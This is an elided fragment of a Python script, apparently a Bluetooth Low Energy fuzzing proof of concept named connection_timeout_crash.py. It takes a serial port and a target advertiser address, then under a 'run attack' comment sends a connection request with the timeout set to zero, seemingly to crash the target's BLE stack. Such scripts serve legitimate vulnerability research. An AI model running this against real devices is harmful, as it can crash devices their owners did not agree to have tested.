...
if args_len < 3:
    sys.exit("Too few arguments provided.\nUsage: python3 connection_timeout_crash.py 'serial_port' 'advertiser_address', ['pcap_filename']")
...
if args_len == 4:
    ...
    pcap_filename = 'connection_timeout_crash_log'
...
# run attack
ble_sul.scan_req()
timeout = FuzzedParam("timeout", 0) 
ble_sul.connection_request_fuzzed(timeout)
ble_sul.termination_indication()
